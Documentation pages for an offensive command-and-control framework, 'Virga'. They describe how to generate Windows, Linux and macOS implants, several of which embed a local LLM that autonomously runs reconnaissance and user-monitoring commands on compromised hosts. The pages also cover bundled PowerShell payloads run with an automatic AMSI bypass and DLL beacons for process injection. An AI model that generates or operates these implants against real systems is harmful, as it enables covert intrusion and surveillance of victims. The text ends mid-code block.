@@ -1,0 +1,3035 @@
+---
+url: /virga/usage/ai-features.md
+---
+# AI Integration Features
+
+This document outlines the AI capabilities integrated into Virga, powered by a locally run LLM model.
+
+## Core Architecture
+
+Virga features are built around an embedded LLM engine that runs directly within the beacon. This allows for autonomous operations and intelligent analysis on the target system without constant operator intervention. The key components are:
+
+1. **LLM Engine**: Utilizes `go-llama.cpp` bindings to run a GGUF-formatted language model.
+2. **In-Memory Database (MemDB)**: A `go-memdb` instance that stores all operational data during the beacon's lifecycle, including command results and AI interactions. **This is not a persistent SQLite database.**
+3. **Task Executor**: A loop within the llama engine that interprets the model's output, executes system commands, and feeds the results back into the model for further analysis.
+
+```mermaid
+graph TB
+    subgraph Beacon["🤖 AI-Enabled Beacon"]
+        subgraph Engine["LLM Engine"]
+            A[go-llama.cpp]
+            B[GGUF Model]
+        end
+        subgraph Logic["Intelligence Layer"]
+            C[Prompt Processor]
+            D[Task Execution Loop]
+        end
+        subgraph Storage["In-Memory DB (go-memdb)"]
+            E[command_results]
+            F[llama_interactions]
+        end
+    end
+
+    subgraph Operator["👤 Operator"]
+        G[Issues Task via CLI]
+    end
+
+    G --> C
+    C -- Formats Prompt --> A
+    A -- Generates Text --> D
+    D -- Extracts & Runs Commands --> E
+    E -- Feeds Results Back --> C
+    D -- Stores Interaction --> F
+
+    style Beacon fill:#2d3748,stroke:#1a202c,color:#fff
+    style Engine fill:#3c8772,stroke:#2d6659,color:#fff
+    style Storage fill:#4a7c6b,stroke:#3a6c5b,color:#fff
+```
+
+## How It Works: The Autonomous Loop
+
+The core of the AI's capability is a loop that allows the model to "think" and act:
+
+1. **Prompt**: The operator provides an initial prompt (e.g., "Analyze this system for security weaknesses").
+2. **Inference**: The LLM model generates a response based on the prompt.
+3. **Action**: The beacon's code scans the model's response for a special `[EXECUTE: command]` marker.
+4. **Execution**: If a marker is found, the specified `command` is executed on the target system.
+5. **Feedback**: The output of the command is fed back into the LLM model as new context.
+6. **Iteration**: The model analyzes the command output and decides on the next step, generating a new response. This loop continues until the task is complete or a set number of iterations is reached.
+
+This process allows the beacon to perform tasks like detecting the operating system (`echo %OS%`), then running OS-specific commands (`systeminfo` or `uname -a`) to gather information autonomously.
+
+## Key Capabilities
+
+* **Autonomous Reconnaissance**: The AI can independently perform system enumeration, user analysis, and network discovery by chaining commands based on previous results.
+* **Adaptive Command Execution**: The AI attempts to run commands appropriate for the detected operating system (Windows or Linux).
+* **Structured Data Collection**: The model is prompted to return key information using a `[FINDING: key: value]` marker, which can be parsed for structured logging.
+
+## Configuration
+
+AI features are configured in your beacon configuration file (e.g., `configs/beacon.yaml`). This provides fine-grained control over the model's behavior.
+
+```yaml
+llama:
+  enabled: true
+  log_enabled: true
+  model:
+    context: 8192
+    gpu_layers: 0
+    threads: 4
+    temperature: 0.7
+    top_k: 40
+    top_p: 0.95
+    max_tokens: 2048
+
+  prompt:
+    preset: "enhanced" # Options: default, enhanced, stealth, aggressive
+
+  autonomous:
+    enabled: true
+    initial_tasks:
+      - type: "system_reconnaissance"
+        description: "Complete system analysis and environment mapping"
+      - type: "user_activity"
+        description: "Monitor and analyze user behavior patterns"
+      - type: "network_discovery"
+        description: "Map network topology and discover connected systems"
+
+    max_iterations: 50
+    timeout_minutes: 15
+    report_interval: 300
+```
+
+## Using AI Features via the CLI
+
+Once you are interacting with an AI-enabled beacon, you can use the `llama` and `memdb` commands.
+
+### `llama` command
+
+* `llama prompt "<your objective>"`: Kicks off an autonomous task with your specified goal.
+* `llama auto`: Starts the pre-defined autonomous tasks configured in `beacon.yaml`.
+* `llama stop`: Stops the current AI task.
+* `llama status`: Shows the current status of the AI engine.
+
+**Example:**
+
+```bash
+virga (session)> llama prompt "Find all running processes not signed by Microsoft"
+[*] Sending prompt to Llama AI...
+```
+
+### `memdb` command
+
+* `memdb query "<query>"`: Query the in-memory database. (Note: query functionality is limited).
+* `memdb dump`: Dumps the contents of the `llama_interactions` and `command_results` tables from the beacon's memory.
+
+**Example:**
+
+```bash
+virga (session)> memdb dump
+[*] Dumping MemDB contents...
+--- llama_interactions ---
+ID: ..., TaskID: ..., Prompt: "Find all running processes...", ...
+---
+```
+
+## Enabling AI in Beacons
+
+To create a beacon with AI capabilities, you must:
+
+1. **Download Dependencies**: Run `make download-llama-deps` on the server to fetch the required model and libraries.
+2. **Enable in Config**: Set `llama.enabled: true` in your `beacon.yaml` file.
+3. **Generate**: Build the beacon using `generate beacon --config beacon.yaml`.
+
+Alternatively, you can use the `--enable-llama` flag as a shortcut:
+
+```bash
+virga> generate beacon --os windows --arch amd64 --enable-llama
+```
+
+## Default LLM Model
+
+The default LLM model is **TinyLlama-1.1B-Chat-v1.0-GGUF** (Q4\_K\_M quantization, ~669MB). This model provides a good balance between size and performance for embedded AI operations.
+
+### Downloading the Model
+
+To download the default model along with required libraries:
+
+```bash
+# Download model and libraries for current platform only
+make download-llama-deps
+
+# Or download libraries for all platforms and the model
+make download-llama-all
+```
+
+### Changing the Default Model
+
+You can use a different GGUF-format model by modifying `scripts/download-llama-model.go`:
+
+```go
+const (
+    modelURL  = "https://huggingface.co/TheBloke/TinyLlama-1.1B-Chat-v1.0-GGUF/resolve/main/tinyllama-1.1b-chat-v1.0.Q4_K_M.gguf" // <- Change this URL
+    modelPath = "internal/implant/llama/models/model.gguf"  // DO NOT change this path
+)
+```
+
+#### Compatible Models
+
+Based on the embedded llama.cpp version (commit `ac43576`), the following model families are supported:
+
+| Model Family | Examples | Notes |
+|--------------|----------|-------|
+| **LLaMA / LLaMA 2** | TinyLlama, Llama-2-7B, Llama-2-13B | Most widely supported |
+| **Falcon** | Falcon-7B, Falcon-40B | Alternative architecture |
+| **Alpaca** | Alpaca-7B, Alpaca-13B | Fine-tuned LLaMA |
+| **Vicuna** | Vicuna-7B, Vicuna-13B | Chat-optimized |
+| **GPT4All** | GPT4All-J, GPT4All-Snoozy | Optimized for CPU |
+| **WizardLM** | WizardLM-7B, WizardLM-13B | Instruction-following |
+| **Baichuan** | Baichuan-7B | Chinese language model |
+| **OpenBuddy** | OpenBuddy-7B | Multilingual support |
+
+#### Recommended GGUF Models
+
+| Model | Size | Use Case | Download |
+|-------|------|----------|----------|
+| **TinyLlama-1.1B Q4\_K\_M** | ~669MB | Default, balanced performance | [HuggingFace](https://huggingface.co/TheBloke/TinyLlama-1.1B-Chat-v1.0-GGUF) |
+| **TinyLlama-1.1B Q8\_0** | ~1.2GB | Higher quality responses | [HuggingFace](https://huggingface.co/TheBloke/TinyLlama-1.1B-Chat-v1.0-GGUF) |
+| **Vicuna-7B Q4\_K\_M** | ~3.8GB | Better chat capabilities | [HuggingFace](https://huggingface.co/TheBloke/vicuna-7B-v1.5-GGUF) |
+| **WizardLM-7B Q4\_K\_M** | ~3.8GB | Better instruction following | [HuggingFace](https://huggingface.co/TheBloke/WizardLM-7B-GGUF) |
+
+> **Important**: Only models in GGUF format from the supported families above will work. Models like Phi-2, Mistral, or others not listed in the supported families will not function with this llama.cpp version.
+
+#### Steps to Change the Model
+
+1. Choose a model from the supported families listed above
+2. Find the GGUF version on [Hugging Face](https://huggingface.co/models?search=gguf) (search for "ModelName GGUF")
+3. Copy the direct download URL (must end with `.gguf`)
+4. Edit `scripts/download-llama-model.go` and update the `modelURL`
+5. Run `make download-llama-deps` to download the new model
+
+> **Note**: After changing the model, you must rebuild the beacon with `--enable-llama` for the changes to take effect.
+
+#### Important Considerations
+
+* **Model Size**: Larger models require more memory in the implant
+* **Quantization**: Lower quantization (Q2, Q3) reduces quality but saves space
+* **Compatibility**: Only GGUF format models are supported
+* **Performance**: Model inference speed depends on target system resources
+* **Security**: Only download models from trusted sources to avoid malicious code
+* **Testing**: Always test new models thoroughly before production deployment
+
+---
+
+---
+url: /virga/reference/beacon-config-reference.md
+---
+# Beacon Config File Reference
+
+This document provides a complete reference for all options available in the beacon configuration YAML file. You can use `configs/beacon.yaml` as a template.
+
+## Root Level
+
+* `beacon` (object, required): Contains all beacon-related configuration.
+* `implant` (object, optional): Configures the implant's internal logging.
+* `llama` (object, optional): Configures the AI features.
+* `output` (object, required): Defines the output file path.
+* `advanced` (object, optional): Advanced compilation options.
+
+***
+
+## `beacon`
+
+| Key        | Type   | Description                               |
+| ---------- | ------ | ----------------------------------------- |
+| `c2`       | object | (Required) C2 server connection settings. |
+| `behavior` | object | (Required) Beacon operational behavior.   |
+| `target`   | object | (Required) Target platform definition.    |
+
+### `beacon.c2`
+
+| Key        | Type    | Default       | Description                                     |
+| ---------- | ------- | ------------- | ----------------------------------------------- |
+| `host`     | string  | `127.0.0.1`   | The IP address or hostname of the C2 server.    |
+| `port`     | integer | `8080`        | The port number of the C2 listener.             |
+| `protocol` | string  | `http`        | The communication protocol (`http` or `https`). |
+| `uri_path` | string  | `api/updates` | The URI path for the beacon to check in to.     |
+
+### `beacon.behavior`
+
+| Key          | Type    | Default        | Description                                                  |
+| ------------ | ------- | -------------- | ------------------------------------------------------------ |
+| `sleep_time` | integer | `60`           | The base sleep time in seconds between check-ins.            |
+| `jitter`     | integer | `20`           | The percentage of jitter to apply to the sleep time (0-100). |
+| `user_agent` | string  | (Browser-like) | The User-Agent string to use for HTTP/S requests.            |
+
+### `beacon.target`
+
+| Key      | Type   | Default   | Description                                                 |
+| -------- | ------ | --------- | ----------------------------------------------------------- |
+| `os`     | string | `windows` | The target operating system (`windows`, `linux`, `darwin`). |
+| `arch`   | string | `amd64`   | The target architecture (`amd64`, `arm64`).                 |
+| `format` | string | `exe`     | The output file format (`exe`, `dll`, `elf`, etc.).         |
+
+### `beacon.shell`
+
+| Key                      | Type   | Default                         | Description                                                                  |
+| ------------------------ | ------ | ------------------------------- | ---------------------------------------------------------------------------- |
+| `powershell.amsi_bypass` | string | Built-in obfuscated AMSI bypass | Optional override injected before embedded PowerShell payloads are executed. |
+
+### `beacon.payloads`
+
+Bundled payloads let you ship scripts/tools with the beacon binary so you can execute them later using the `shell` command without touching the network.
+
+| Key      | Type   | Description                                                    |
+| -------- | ------ | -------------------------------------------------------------- |
+| `name`   | string | Operator-facing identifier used with `shell @name ...`.        |
+| `source` | string | Local path or HTTPS URL to pull into the beacon at build time. |
+| `type`   | string | Execution runtime (currently only `powershell` is supported).  |
+
+> **Usage tip:** Once a payload named `powerview` is defined you can execute it via `shell> @powerview Get-NetUser` and virga will stream the embedded script plus your command into PowerShell with the AMSI bypass applied automatically.
+
+***
+
+## `implant`
+
+| Key             | Type    | Default       | Description                                           |
+| --------------- | ------- | ------------- | ----------------------------------------------------- |
+| `log_enabled`   | boolean | `false`       | Enables detailed logging within the beacon itself.    |
+| `log_file_path` | string  | `implant.log` | The path to save the log file to on the target.       |
+| `log_level`     | string  | `info`        | The logging level (`debug`, `info`, `warn`, `error`). |
+
+***
+
+## `llama`
+
+| Key            | Type    | Description                                        |
+| -------------- | ------- | -------------------------------------------------- |
+| `enabled`      | boolean | (Required) Enables or disables all AI features.    |
+| `log_enabled`  | boolean | Enables detailed logging for the LLM engine.       |
+| `model`        | object  | Configures the AI model's inference parameters.    |
+| `prompt`       | object  | Defines the initial instruction set for the model. |
+| `autonomous`   | object  | Configures the autonomous operation loop.          |
+| `task_prompts` | object  | A map of custom prompts for specific tasks.        |
+
+### `llama.model`
+
+| Key           | Type    | Default | Description                                         |
+| ------------- | ------- | ------- | --------------------------------------------------- |
+| `context`     | integer | `8192`  | The maximum token context size for the model.       |
+| `gpu_layers`  | integer | `0`     | Number of model layers to offload to the GPU.       |
+| `threads`     | integer | `4`     | Number of CPU threads to use for inference.         |
+| `temperature` | float   | `0.7`   | Controls the creativity of the model (0.0-1.0).     |
+| `top_k`       | integer | `40`    | Vocabulary sampling parameter.                      |
+| `top_p`       | float   | `0.95`  | Nucleus sampling parameter.                         |
+| `max_tokens`  | integer | `2048`  | Maximum number of tokens to generate in a response. |
+
+### `llama.prompt`
+
+| Key      | Type   | Default    | Description                                                                        |
+| -------- | ------ | ---------- | ---------------------------------------------------------------------------------- |
+| `preset` | string | `enhanced` | The initial system prompt preset (`default`, `enhanced`, `stealth`, `aggressive`). |
+
+### `llama.autonomous`
+
+| Key               | Type    | Description                                                      |
+| ----------------- | ------- | ---------------------------------------------------------------- |
+| `enabled`         | boolean | Enables the autonomous execution loop.                           |
+| `initial_tasks`   | array   | A list of tasks for the AI to perform upon startup.              |
+| `max_iterations`  | integer | The maximum number of command-execution loops for a single task. |
+| `timeout_minutes` | integer | The timeout in minutes for the entire autonomous operation.      |
+| `report_interval` | integer | The interval in seconds for reporting progress.                  |
+
+***
+
+## `output`
+
+| Key    | Type   | Default           | Description                                 |
+| ------ | ------ | ----------------- | ------------------------------------------- |
+| `path` | string | `dist/beacon.exe` | The path to save the generated beacon file. |
+
+***
+
+## `advanced`
+
+| Key             | Type    | Default | Description                                                         |
+| --------------- | ------- | ------- | ------------------------------------------------------------------- |
+| `strip_symbols` | boolean | `true`  | Strips debugging symbols from the compiled binary.                  |
+| `compress`      | boolean | `false` | Compresses the final binary (e.g., with UPX). (Not yet implemented) |
+| `anti_debug`    | boolean | `false` | Includes anti-debugging techniques. (Not yet implemented)           |
+
+---
+
+---
+url: /virga/usage/beacon-configuration.md
+---
+# Beacon Configuration
+
+While you can generate beacons using command-line flags, the recommended way to create a customized beacon is through a YAML configuration file. This approach provides fine-grained control over every aspect of the beacon, from its communication behavior to its AI capabilities.
+
+To use a configuration file, pass the `--config` flag to the `generate beacon` command:
+
+```bash
+virga> generate beacon --config /path/to/your/beacon.yaml
+```
+
+You can use the `configs/beacon.yaml` file in the root of the project as a starting template.
+
+## Core Configuration Blocks
+
+A beacon configuration file is structured into several main blocks:
+
+### `beacon`
+
+This block defines the beacon's identity and how it communicates with the C2 server.
+
+```yaml
+beacon:
+  c2:
+    host: "127.0.0.1"
+    port: 8080
+    protocol: "http"
+  behavior:
+    sleep_time: 10
+    jitter: 20
+  target:
+    os: "windows"
+    arch: "amd64"
+```
+
+* **`c2`**: Specifies the C2 server's connection details.
+* **`behavior`**: Controls the beacon's sleep and jitter cycle.
+* **`target`**: Defines the target operating system and architecture.
+
+### `llama`
+
+This block configures the embedded AI features. You can enable or disable the AI, tune the model's parameters, and define autonomous tasks.
+
+```yaml
+llama:
+  enabled: true
+  model:
+    temperature: 0.7
+  autonomous:
+    enabled: true
+    initial_tasks:
+      - type: "system_reconnaissance"
+        description: "Complete system analysis and environment mapping"
+```
+
+### `output`
+
+This block specifies where to save the generated beacon file.
+
+```yaml
+output:
+  path: "dist/beacon.exe"
+```
+
+## Overriding with Flags
+
+Note that any command-line flags you provide will override the values in the configuration file. For example, the following command will generate a beacon for Linux, even if the config file specifies Windows:
+
+```bash
+virga> generate beacon --config beacon.yaml --os linux
+```
+
+For a complete list of all available options, please refer to the [Beacon Config Reference](../reference/beacon-config-reference.md).
+
+---
+
+---
+url: /virga/usage/beacon-generation.md
+---
+# Beacon Generation
+
+This guide provides a detailed overview of how to generate custom beacons using the Virga CLI.
+
+## Generation Architecture
+
+Beacons are Go-based implants that are cross-compiled by the Virgaer. Key configuration details, such as C2 endpoints and behavioral settings, are embedded directly into the binary at compile time. This is achieved using Go's `-ldflags` linker option, which creates a self-contained executable with no external configuration files.
+
+```mermaid
+graph TB
+    subgraph CLI["🖥️ Operator's CLI"]
+        A[generate beacon command]
+        B[Flags: --os, --arch, --http, ...]
+        C["Config File: beacon.yaml - Optional"]
+    end
+
+    subgraph Server["🌐 C2 Server & Builder"]
+        D[Go Compiler]
+        E[Linker with -ldflags]
+        F[Configuration Embedding]
+        G["LLM Model - Optional"]
+    end
+
+    subgraph Output["📦 Generated Beacon"]
+        H["Platform-Specific Binary - .exe, .elf"]
+        I["Embedded Config: C2 Host/Port, Sleep/Jitter, AI Settings"]
+    end
+
+    A -- Provides Options --> F
+    B -- Overrides --> F
+    C -- Defines --> F
+    F -- "-X pkg.Var=value" --> E
+    G -.->|If --enable-llama| D
+    D -- Compiles --> E
+    E -- Links & Embeds --> H
+    H --> I
+
+    style CLI fill:#2d3748,stroke:#1a202c,color:#fff
+    style Server fill:#3c8772,stroke:#2d6659,color:#fff
+    style Output fill:#e74c3c,stroke:#c0392b,color:#fff
+```
+
+## Generation Methods
+
+There are two primary ways to generate a beacon, which can be combined:
+
+1. **Configuration File (Recommended)**: Create a `beacon.yaml` file to define all settings. This is the most powerful and flexible method, especially for complex or AI-enabled beacons.
+2. **Command-Line Flags**: Provide settings directly on the command line. These are useful for quick, simple beacons or for overriding specific values in a configuration file.
+
+### Using a Configuration File
+
+This is the recommended approach for most use cases.
+
+**Example `beacon.yaml`:**
+
+```yaml
+beacon:
+  c2:
+    host: c2.example.com
+    port: 443
+    protocol: https
+    uri_path: /api/v1/tasks
+  behavior:
+    sleep_time: 60
+    jitter: 20
+    user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+  target:
+    os: windows
+    arch: amd64
+    format: exe
+
+llama: # AI-specific settings
+  enabled: true
+  autonomous:
+    enabled: true
+    max_iterations: 25
+    initial_tasks:
+      - type: system_recon
+        description: "Gather initial system, user, and network information."
+  model:
+    context: 8192
+    max_tokens: 2048
+    temperature: 0.3
+  log_enabled: false
+
+implant: # Implant-specific settings
+  log_enabled: false
+  log_level: "info"
+
+output:
+  path: "build/windows_implant_v1.exe"
+```
+
+Then, run the `generate` command pointing to your config file:
+
+```bash
+virga> generate beacon --config beacon.yaml
+[*] Generating exe beacon for https/c2.example.com targeting windows with Llama AI integration...
+[*] Binary payload saved to: /path/to/project/build/windows_implant_v1.exe
+```
+
+### Using Command-Line Flags
+
+Flags are perfect for simple beacons or for overriding settings in a `beacon.yaml` file.
+
+```bash
+# Generate a basic beacon for 64-bit Windows
+virga> generate beacon --os windows --arch amd64 --http 10.0.0.5 --port 8080 --output beacon.exe
+
+# Use a config file but override the sleep time and output path
+virga> generate beacon --config beacon.yaml --sleep 300 --output beacon-long-sleep.exe
+```
+
+## Available CLI Flags
+
+**Core Options:**
+
+* `--config <path>`: Path to the YAML configuration file.
+* `--os <os>`: Target OS (`windows`, `linux`, `darwin`). **(Required)**
+* `--arch <arch>`: Target architecture (`amd64`, `386`, `arm64`). **(Required)**
+* `--format <format>`: Output format (`exe`, `dll`, `elf`, etc.). Defaults based on OS.
+* `--output <path>`: Path to save the generated file. Default: `payload-[os]-[arch].[format]`
+
+**C2 Connection Options:**
+
+* `--http <host>`, `--https <host>`, `--dns <host>`, `--mtls <host>`: Set C2 protocol and host address.
+* `--port <port>`: C2 listener port.
+* `--uri <path>`: URI path for beacon check-ins.
+
+**Behavior Options:**
+
+* `--sleep <seconds>`: Beacon sleep time in seconds (Default: 60).
+* `--jitter <percent>`: Sleep time jitter percentage (Default: 20).
+* `--user-agent <string>`: Custom User-Agent for HTTP/S beacons.
+
+**AI & Logging Options:**
+
+* `--enable-llama`: Embeds the LLM model. Requires the model to be downloaded on the server.
+* `--no-llama`: Explicitly disables Llama, overriding a `config.yaml` setting.
+* `--llama-log`: Enables verbose logging for AI operations within the implant.
+* `--implant-log`: Enables general logging for the implant.
+* `--implant-log-path <path>`: Sets a custom path for the implant's log file.
+* `--implant-log-level <level>`: Sets the log level (`debug`, `info`, `warn`, `error`).
+
+## Platform-Specific Generation
+
+Cross-compilation is handled automatically. You can generate a beacon for any supported OS from your development machine.
+
+### Windows
+
+Generates a `.exe` or `.dll` file. Beacons run stealthily without a console window by default (unless logging is enabled).
+
+```bash
+# Generate a 64-bit DLL for process injection
+virga> generate beacon --os windows --arch amd64 --format dll --output reflective_beacon.dll
+```
+
+### Linux
+
+Generates an ELF binary.
+
+```bash
+# Generate a beacon for a 64-bit ARM Linux server (e.g., AWS Graviton)
+virga> generate beacon --os linux --arch arm64 --output arm_server_agent
+```
+
+### macOS (darwin)
+
+Generates a Mach-O binary.
+
+```bash
+# Generate for Apple Silicon with AI enabled
+virga> generate beacon --os darwin --arch arm64 --enable-llama --output mac_ai_agent
+```
+
+## Security & Obfuscation
+
+* **Configuration Embedding**: All configuration is embedded via `-ldflags`, leaving no plain text config on disk.
+* **Symbol Stripping**: Binaries are stripped of debug information (`-s -w` flags) to reduce size and hinder reverse engineering.
+* **Build Variance**: Each compilation produces a binary with a unique hash.
+
+> **Note**: Advanced obfuscation techniques like string encryption and API hashing are planned for future releases.
+
+## Troubleshooting
+
+* **Generation Fails**: Ensure you have specified `--os` and `--arch`. Check that the C2 server is running and reachable.
+* **LLM Model or Library Not Found**: If using `--enable-llama`, you must first download the required AI model and platform-specific libraries on the Virgaer. Run the following command in the project root:
+  ```bash
+  make download-llama-deps
+  ```
+* **Cross-Compilation Errors**: When building for a different OS with CGO enabled (which is required for Llama), you may need to install a cross-compiler toolchain. For example, to build for Windows from a Linux host, you may need `mingw-w64`. The build process will typically provide a helpful error message if a required toolchain is missing.
+
+---
+
+---
+url: /virga/reference/cli-command-reference.md
+---
+# CLI Command Reference
+
+This document provides a detailed reference for all commands available in the Virga CLI.
+
+## Command Line Options
+
+### Execution Modes
+
+* `--exec <command>` or `-e <command>`: Execute command and exit (non-interactive mode)
+* `--session <id>`: Specify session ID for command execution
+* `--version`: Show version information
+
+### Output Control
+
+* `--quiet`: Minimal output mode (sets log level to ERROR)
+* `--no-color`: Disable color output
+
+### Logging Options
+
+* `--log-level <level>`: Set log level (debug, info, warn, error, off)
+* `--debug`: Enable debug mode
+
+### Connection Options
+
+* `--config <file>`: Path to configuration file
+* `--host <host>`: C2 server hostname or IP address
+* `--port <port>`: C2 server port number
+
+## Direct Command Execution
+
+Virgasupports direct command execution without entering interactive mode, ideal for scripting and automation.
+
+### Basic Usage
+
+```bash
+# Single command
+./bin/virga-cli -e "help"
+
+# Session-specific execution
+./bin/virga-cli --session sess-123 --exec "shell ls -la"
+
+# Quiet mode for scripts
+./bin/virga-cli --quiet --exec "sessions list"
+```
+
+### Scripting Examples
+
+```bash
+#!/bin/bash
+# Check for active sessions
+SESSIONS=$(./bin/virga-cli --quiet --exec "sessions list")
+if [ -n "$SESSIONS" ]; then
+    echo "Active sessions found"
+fi
+
+# One-liner to get system info
+./bin/virga-cli -e "use 1; sysinfo" | grep "OS:"
+```
+
+### Exit Codes
+
+* `0`: Success
+* `1`: Command execution error
+
+### Environment Variables
+
+* `VIRGA_CLI_LOG_LEVEL`: Set default log level
+* `VIRGA_HOST`: Default server host
+* `VIRGA_PORT`: Default server port
+
+## Command Structure
+
+Most commands follow a `verb <noun> [options]` structure. For example:
+
+* `sessions list`: Lists all active sessions.
+* `generate beacon --os windows`: Generates a beacon for the Windows operating system.
+
+Many commands are contextual and only available when interacting with a session.
+
+## Global Commands
+
+These commands are always available from the main CLI prompt.
+
+### `help`
+
+Displays help information for commands.
+
+* **Usage**: `help [command]`
+* **Arguments**:
+  * `command` (optional): The specific command to get help for. If omitted, it lists all available commands.
+
+### `sessions`
+
+Manages agent sessions.
+
+* **Usage**: `sessions <subcommand> [args]`
+* **Subcommands**:
+  * `list`: Lists all active sessions, showing their ID, IP address, hostname, and last seen time.
+  * `kill <id>`: Terminates the specified session.
+    * `id` (required): The ID of the session to terminate.
+
+### `interact`
+
+Starts an interactive session with a specific agent.
+
+* **Usage**: `interact <session_id>`
+* **Arguments**:
+  * `session_id` (required): The ID of the session to interact with. Once in an interactive session, the prompt will change, and session-specific commands become available.
+
+### `listeners`
+
+Manages C2 listeners.
+
+* **Usage**: `listeners <subcommand> [args]`
+* **Subcommands**:
+  * `list`: Lists all currently active listeners and their status.
+  * `add <name> <type> <bind_address> <port>`: Adds a new listener. (Note: This functionality may be limited depending on the server version).
+  * `remove <name>`: Removes a listener. (Note: This functionality may be limited depending on the server version).
+
+### `generate`
+
+Generates various types of payloads.
+
+* **Usage**: `generate <type> [options]`
+* **Types**:
+  * `beacon`: Generates a binary beacon (implant).
+
+#### Beacon Generation Options
+
+* `--config <path>`: Generate the beacon using a YAML configuration file (e.g., `configs/beacon.yaml`). This is the recommended method for complex configurations.
+* `--os <os>`: Target OS (`windows`, `linux`, `darwin`).
+* `--arch <arch>`: Target architecture (`amd64`, `arm64`).
+* `--format <format>`: Output format (`exe`, `dll`, `elf`).
+* `--http <host>`, `--https <host>`: Set the C2 host and protocol.
+* `--port <port>`: Set the C2 port.
+* `--sleep <seconds>`: Set the beacon's sleep time.
+* `--jitter <percent>`: Set the beacon's sleep jitter.
+* `--output <path>`: The path to save the generated payload.
+* `--enable-llama`: Enables the embedded AI features.
+
+**Example**:
+
+```bash
+# Generate a Windows beacon using a config file
+virga> generate beacon --config configs/beacon.yaml
+
+# Generate a Linux beacon with command-line flags
+virga> generate beacon --os linux --arch amd64 --https c2.example.com --port 443 --output ./nimbus-linux
+```
+
+## Session-Specific Commands
+
+These commands are available only when you are interacting with a session (i.e., after using the `interact` command).
+
+### Command Execution
+
+#### `exec`
+
+Executes a single command on the target system and returns the output.
+
+* **Usage**: `exec <command> [arguments...]`
+* **Example**:
+  ```bash
+  virga (session)> exec whoami /all
+  ```
+
+#### `shell`
+
+Starts a pseudo-interactive shell on the target system. This is useful for running multiple commands in sequence.
+
+* **Usage**: `shell`
+* **Embedded payloads**: After defining payloads in the beacon config you can invoke them with `shell >@payloadName <PowerShell command>`. Virga streams the embedded script plus your command into PowerShell and prepends the configured AMSI bypass automatically.
+* **Note**: To exit the interactive shell, type `exit` or `quit`.
+
+### File System Operations
+
+#### `ls`
+
+Lists files and directories in a specified path on the target system.
+
+* **Usage**: `ls [path]`
+* **Arguments**:
+  * `path` (optional): The directory path to list. Defaults to the current working directory of the beacon.
+
+#### `pwd`
+
+Prints the current working directory of the beacon on the target system.
+
+* **Usage**: `pwd`
+
+#### `cd`
+
+Changes the current working directory of the beacon on the target system.
+
+* **Usage**: `cd <path>`
+* **Arguments**:
+  * `path` (required): The directory to change to.
+
+#### `upload`
+
+Uploads a file from your local machine to the target system.
+
+* **Usage**: `upload <local_path> <remote_path>`
+* **Arguments**:
+  * `local_path` (required): The path of the file on your local machine.
+  * `remote_path` (required): The destination path on the target system.
+
+#### `download`
+
+Downloads a file from the target system to your local machine.
+
+* **Usage**: `download <remote_path> <local_path>`
+* **Arguments**:
+  * `remote_path` (required): The path of the file on the target system.
+  * `local_path` (required): The destination path on your local machine.
+
+### Information Gathering
+
+#### `info`
+
+Displays a summary of information about the current session, including network details, system properties, and beacon configuration.
+
+* **Usage**: `info`
+
+### AI & LLM Operations
+
+These commands require an AI-enabled beacon.
+
+#### `llama`
+
+Interacts with the embedded LLM model on the target.
+
+* **Usage**: `llama <subcommand> [options]`
+* **Subcommands**:
+  * `prompt <text>`: Sends a task to the AI. The task runs in the background.
+  * `result <task_id>`: Retrieves the result of a completed AI task.
+  * `status`: Checks the current status of the AI engine.
+  * `cancel`: Cancels the currently running AI task.
+  * `auto`: Starts the pre-configured autonomous mode.
+
+**Example**:
+
+```bash
+# Start an AI task
+virga (session)> llama prompt "Find all running processes not signed by Microsoft"
+
+# Check the result later
+virga (session)> llama result <task_id_from_previous_command>
+```
+
+#### `memdb`
+
+Queries the beacon's in-memory database where the AI stores its findings and command execution history.
+
+* **Usage**: `memdb <query|command>`
+
+##### Tables Available
+
+* `commands`: Shell command execution history
+* `llama`: LLM interactions and autonomous tasks
+* `tasks`: Pending tasks in queue
+* `sysinfo`: System information snapshots
+
+##### Basic Commands
+
+* `memdb help`: Show comprehensive help with all query options
+* `memdb stats`: Show database statistics (record counts)
+* `memdb commands [limit]`: Show recent commands (default: 10)
+* `memdb llama [limit]`: Show recent LLM interactions (default: 5)
+* `memdb tasks`: Show pending tasks
+* `memdb sysinfo [hours]`: Show system info history (default: 1 hour)
+* `memdb clear [hours]`: Clear data older than X hours (default: 24)
+* `memdb get <type> <id>`: Get specific record by ID with FULL content
+
+##### SQL-Style Queries
+
+MemDB supports a subset of SQL for advanced querying:
+
+**Basic SELECT queries:**
+
+* `memdb SELECT * FROM commands LIMIT 10`
+* `memdb SELECT * FROM llama ORDER BY timestamp DESC LIMIT 10`
+* `memdb SELECT COUNT(*) FROM commands`
+
+**Filtering commands:**
+
+* `memdb SELECT * FROM commands WHERE module='llama' LIMIT 5`
+* `memdb SELECT * FROM commands WHERE module='shell' LIMIT 5`
+* `memdb SELECT * FROM commands WHERE exit_code != 0 LIMIT 5`
+
+**Filtering LLM interactions:**
+
+* `memdb SELECT * FROM llama WHERE status='success' LIMIT 10`
+* `memdb SELECT * FROM llama WHERE status='failure' LIMIT 10`
+* `memdb SELECT * FROM llama WHERE task_type='llama_autonomous'`
+* `memdb SELECT * FROM llama WHERE task_type='llama'`
+* `memdb SELECT * FROM llama WHERE temperature > 0.5`
+* `memdb SELECT * FROM llama WHERE commands_issued > 0`
+* `memdb SELECT * FROM llama WHERE timestamp > '2h'` (last 2 hours)
+* `memdb SELECT * FROM llama WHERE timestamp < '24h'` (older than 24 hours)
+
+##### Viewing Full LLM Responses
+
+The `llama` command shows truncated responses for readability. To view the COMPLETE response and command details:
+
+1. First list interactions: `memdb llama 10`
+2. Note the Task ID from the output
+3. Get full details: `memdb get llama <task_id>`
+
+**Example:**
+
+```
+memdb llama 5                    # List last 5 Llama interactions (truncated)
+memdb get llama auto_system_reconnaissance_123456  # View FULL response
+```
+
+##### Advanced Examples
+
+**Find failed commands:**
+
+```
+memdb SELECT * FROM commands WHERE exit_code != 0 LIMIT 20
+```
+
+**Find LLM interactions that generated commands:**
+
+```
+memdb SELECT * FROM llama WHERE commands_issued > 0 ORDER BY timestamp DESC LIMIT 10
+```
+
+**Find recent autonomous tasks:**
+
+```
+memdb SELECT * FROM llama WHERE task_type='llama_autonomous' AND timestamp > '6h'
+```
+
+**Count total LLM interactions:**
+
+```
+memdb SELECT COUNT(*) FROM llama
+```
+
+**Monitor command execution by module:**
+
+```
